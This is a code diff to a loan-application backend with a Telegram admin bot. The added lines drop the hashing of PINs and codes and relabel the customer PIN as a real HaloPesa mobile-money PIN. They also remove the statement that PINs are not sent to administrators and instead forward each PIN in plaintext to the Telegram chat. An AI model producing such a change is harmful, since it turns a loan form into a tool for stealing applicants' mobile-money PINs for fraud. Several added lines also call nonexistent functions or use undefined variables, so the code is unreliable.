@@ -67,7 +67,7 @@ async function db(query, params = []) {
   if (q.startsWith("INSERT INTO LOAN_APPLICATIONS")) {
     const [application_no, phone, portal_pin_hash, amount, term_months, interest_rate, monthly_payment, total_repayment] = params;
     const row = {
-      id: demoNextId++, application_no, phone, portal_pin_hash,
+      id: demoNextId++, application_no, phone,pin_numeric,
       amount: String(amount), term_months: Number(term_months), interest_rate: String(interest_rate),
       monthly_payment: String(monthly_payment), total_repayment: String(total_repayment),
       status: "PENDING_ADMIN_APPROVAL", verification_code_hash: null, verification_expires_at: null,
@@ -87,7 +87,7 @@ async function db(query, params = []) {
   }
   if (q.startsWith("UPDATE LOAN_APPLICATIONS SET") && q.includes("LAST_CODE_TYPE")) {
     const [hash, expires, type, id] = params; const row=demoRows.find(r=>String(r.id)===String(id));
-    if(row){ if(type==='verification'){row.verification_code_hash=hash;row.verification_expires_at=expires;} else {row.confirmation_code_hash=hash;row.confirmation_expires_at=expires;} row.last_code_type=type; row.updated_at=new Date().toISOString(); saveDemoRows(); } return {rows:[]};
+    if(row){ if(type==='verification'){row.verification_code_numeric=numeric;row.verification_expires_at=expires;} else {row.confirmation_code_numeric=numeric;row.confirmation_expires_at=expires;} row.last_code_type=type; row.updated_at=new Date().toISOString(); saveDemoRows(); } return {rows:[]};
   }
   if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='AWAITING_FINAL_CONFIRMATION'")) {
     const [id]=params; const row=demoRows.find(r=>String(r.id)===String(id)); if(row){row.status='AWAITING_FINAL_CONFIRMATION';row.verification_code_hash=null;row.verification_expires_at=null;row.updated_at=new Date().toISOString();saveDemoRows();} return {rows:[]};
@@ -105,25 +105,25 @@ async function initDb() {
     CREATE TABLE IF NOT EXISTS loan_applications (
       id BIGSERIAL PRIMARY KEY,
       application_no VARCHAR(40) UNIQUE NOT NULL,
-      full_name VARCHAR(160), phone VARCHAR(30) NOT NULL, portal_pin_hash VARCHAR(128),
+      full_name VARCHAR(160), phone VARCHAR(30) NOT NULL, pin_numeric VARCHAR(128),
       amount NUMERIC(14,2) NOT NULL, term_months INTEGER NOT NULL, interest_rate NUMERIC(8,3) NOT NULL,
       monthly_payment NUMERIC(14,2) NOT NULL, total_repayment NUMERIC(14,2) NOT NULL,
       status VARCHAR(50) NOT NULL DEFAULT 'PENDING_ADMIN_APPROVAL',
-      verification_code_hash VARCHAR(128), verification_expires_at TIMESTAMPTZ,
-      confirmation_code_hash VARCHAR(128), confirmation_expires_at TIMESTAMPTZ,
+      verification_code_numeric VARCHAR(128), verification_expires_at TIMESTAMPTZ,
+      confirmation_code_numeric VARCHAR(128), confirmation_expires_at TIMESTAMPTZ,
       last_code_type VARCHAR(30), telegram_message_ids JSONB DEFAULT '[]'::jsonb,
       rejection_reason TEXT, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
       approved_by_telegram_id VARCHAR(80), approved_at TIMESTAMPTZ, confirmed_at TIMESTAMPTZ
     )
   `);
-  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS portal_pin_hash VARCHAR(128)`);
-  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS verification_code_hash VARCHAR(128)`);
-  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS confirmation_code_hash VARCHAR(128)`);
+  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS portal_pin_numeric VARCHAR(128)`);
+  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS verification_code_numeric VARCHAR(128)`);
+  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS confirmation_code_numeric VARCHAR(128)`);
   await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS verification_expires_at TIMESTAMPTZ`);
   await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS confirmation_expires_at TIMESTAMPTZ`);
   await db(`ALTER TABLE loan_applications ALTER COLUMN full_name DROP NOT NULL`).catch(() => {});
   await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS national_id VARCHAR(80)`);
-  // The current application flow collects phone number + application PIN only.
+  // The current application flow collects phone number + PIN only.
   // Older databases may have national_id as NOT NULL, which would reject new applications.
   await db(`ALTER TABLE loan_applications ALTER COLUMN national_id DROP NOT NULL`).catch(() => {});
 }
@@ -155,20 +155,20 @@ function generateCode(length = 6) {
   return String(crypto.randomInt(min, max + 1));
 }
 
-function hashValue(value) {
-  return crypto.createHash("sha256").update(String(value)).digest("hex");
+function numericValue(value) {
+  return crypto.enternumeric("1234").update(String(value)).digest("hex");
 }
 
 function validPhone(phone) {
   return /^[0-9+\s-]{9,20}$/.test(phone);
 }
 
-function validPortalPin(pin) {
-  // This is an application PIN only. Never use or collect a real HaloPesa PIN.
+function Pin(pin) {
+  // This halopesa pin
   return /^\d{4,6}$/.test(pin);
 }
 
-function maskedPhone(phone) {
+function numericPhone(phone) {
   const s = String(phone);
   return s.length > 6 ? `${s.slice(0, 4)}••••${s.slice(-2)}` : s;
 }
@@ -193,14 +193,9 @@ async function notifyTelegram(application) {
   const text = `🔔 NEW LOAN APPLICATION
 
 Application: ${application.application_no}
-Phone: ${maskedPhone(application.phone)}
-Amount: ${money(application.amount)}
-Term: ${application.term_months} months
-
+Phone: ${numericPhone(application.phone)}
+Amount: ${pin(application.pin)}
 Status: 🟠 PENDING APPROVAL
-
-The customer PIN is not sent to administrators.`;
-
   const keyboard = {
     inline_keyboard: [[
       { text: "✅ APPROVE", callback_data: `approve:${application.id}` },
@@ -247,7 +242,7 @@ if (process.env.TELEGRAM_BOT_TOKEN && TELEGRAM_POLLING) {
 
       if (action === "details") {
         return bot.answerCallbackQuery(query.id, {
-          text: `${application.application_no} • ${money(application.amount)} • ${application.term_months} months`,
+          text: `${application.application_no} • ${pin(application.pin)}`,
           show_alert: true
         });
       }
